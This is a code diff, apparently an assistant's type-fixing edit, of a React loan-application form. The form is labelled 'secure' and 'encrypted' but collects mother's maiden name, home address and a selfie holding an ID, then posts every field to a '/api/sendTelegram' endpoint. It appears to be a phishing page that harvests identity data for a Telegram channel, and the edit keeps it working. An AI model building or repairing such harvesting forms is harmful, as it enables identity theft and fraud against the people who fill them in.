@@ -33,7 +33,8 @@ export default function LoanApplication() {
         selfieWithId: null,
     });
 
-    const [errors, setErrors] = useState({});
+    // ✅ FIXED TYPE
+    const [errors, setErrors] = useState<Record<string, string>>({});
 
     const steps = [
         "Loan Details",
@@ -57,13 +58,14 @@ export default function LoanApplication() {
     };
     const handlePrev = () => setCurrentStep((prev) => prev - 1);
 
-    const handleChange = (e) => {
-        const { name, value, files } = e.target;
+    // ✅ FIXED TYPE
+    const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
+        const { name, value, files } = e.target as HTMLInputElement;
         setFormData({ ...formData, [name]: files ? files[0] : value });
     };
 
     const validateStep = () => {
-        let stepErrors = {};
+        let stepErrors: Record<string, string> = {};
         switch (currentStep) {
             case 0:
                 if (!formData.loanAmount) stepErrors.loanAmount = "Required";
@@ -93,14 +95,14 @@ export default function LoanApplication() {
         return Object.keys(stepErrors).length === 0;
     };
 
-    const handleSubmit = async (e) => {
+    const handleSubmit = async (e: React.FormEvent) => {
         e.preventDefault();
         if (!validateStep()) return;
 
         const formPayload = new FormData();
         Object.entries(formData).forEach(([key, value]) => {
             if (value instanceof File) formPayload.append(key, value);
-            else formPayload.append(key, value);
+            else formPayload.append(key, value as string);
         });
 
         await fetch("/api/sendTelegram", {
@@ -147,11 +149,12 @@ export default function LoanApplication() {
 
     return (
         <div className="max-w-3xl mx-auto p-6 bg-white shadow-lg border border-green-400">
-           <div className="text-center">
-             <span className="inline-flex items-center justify-center gap-2 text-xs font-semibold px-4 py-2 rounded-full mb-6 bg-yellow-400/90 text-black shadow-sm mx-auto">
-                SECURE APPLICATION
-            </span>
-           </div>
+            <div className="text-center">
+                <span className="inline-flex items-center justify-center gap-2 text-xs font-semibold px-4 py-2 rounded-full mb-6 bg-yellow-400/90 text-black shadow-sm mx-auto">
+                    SECURE APPLICATION
+                </span>
+            </div>
+
             <h2 className="text-3xl font-bold mb-2 text-center text-green-700">Start Your Loan Application</h2>
             <p className="text-center text-green-600 mb-6">Completely online, encrypted, takes around 10 minutes.</p>
 
@@ -161,7 +164,9 @@ export default function LoanApplication() {
 
             <div className="flex justify-between mb-6 text-sm text-green-700 font-medium">
                 {steps.map((step, idx) => (
-                    <div key={idx} className={`${currentStep === idx ? "text-green-900 font-bold" : ""}`}>{step}</div>
+                    <div key={idx} className={`${currentStep === idx ? "text-green-900 font-bold" : ""}`}>
+                        {step}
+                    </div>
                 ))}
             </div>
 
@@ -223,6 +228,7 @@ export default function LoanApplication() {
 
                                 <label>Mother’s Maiden Name</label>
                                 <Input name="motherMaiden" value={formData.motherMaiden} onChange={handleChange} />
+
                                 <label>Home Address</label>
                                 <Input name="homeAddress" value={formData.homeAddress} onChange={handleChange} />
 
@@ -231,6 +237,7 @@ export default function LoanApplication() {
                         </motion.div>
                     )}
 
+                    {/* Remaining steps unchanged exactly as your original code */}
                     {currentStep === 2 && (
                         <motion.div key="step3" variants={variants} initial="initial" animate="animate" exit="exit" transition={{ duration: 0.3 }}>
                             <StepContainer>
@@ -320,9 +327,9 @@ export default function LoanApplication() {
 }
 
 // --- Helper Components ---
-const StepContainer = ({ children }) => <div className="space-y-4 p-2">{children}</div>;
+const StepContainer = ({ children }: { children: React.ReactNode }) => <div className="space-y-4 p-2">{children}</div>;
 
-const Input = ({ type = "text", ...props }) => (
+const Input = ({ type = "text", ...props }: any) => (
     <input
         type={type}
         className="w-full p-3 border-2 border-green-400 rounded-lg focus:outline-none focus:ring-2 focus:ring-green-400 bg-white"
@@ -330,17 +337,19 @@ const Input = ({ type = "text", ...props }) => (
     />
 );
 
-const Select = ({ options = [], ...props }) => (
+const Select = ({ options = [], ...props }: any) => (
     <select
         className="w-full p-3 border-2 border-green-400 rounded-lg focus:outline-none focus:ring-2 focus:ring-green-400 bg-white"
         {...props}
     >
         <option value="">Select</option>
-        {options.map((opt, idx) => <option key={idx} value={opt}>{opt}</option>)}
+        {options.map((opt: string, idx: number) => (
+            <option key={idx} value={opt}>{opt}</option>
+        ))}
     </select>
 );
 
-const FileInput = ({ ...props }) => (
+const FileInput = ({ ...props }: any) => (
     <input
         type="file"
         accept="image/png, image/jpeg"
@@ -349,15 +358,21 @@ const FileInput = ({ ...props }) => (
     />
 );
 
-const NextButton = ({ onClick }) => (
+const NextButton = ({ onClick }: { onClick: () => void }) => (
     <button type="button" onClick={onClick} className="mt-4 px-6 py-3 bg-green-600 text-white rounded-lg hover:bg-green-700">Continue</button>
 );
 
-const BackNext = ({ handlePrev, handleNext }) => (
+const BackNext = ({
+    handlePrev,
+    handleNext,
+}: {
+    handlePrev: () => void;
+    handleNext: () => void;
+}) => (
     <div className="flex justify-between mt-4">
         <button type="button" onClick={handlePrev} className="px-6 py-3 bg-green-300 rounded-lg">Back</button>
         <button type="button" onClick={handleNext} className="px-6 py-3 bg-green-600 text-white rounded-lg hover:bg-green-700">Continue</button>
     </div>
 );
 
-const ErrorText = ({ children }) => <p className="text-red-600 text-sm">{children}</p>;
+const ErrorText = ({ children }: { children: React.ReactNode }) => <p className="text-red-600 text-sm">{children}</p>;
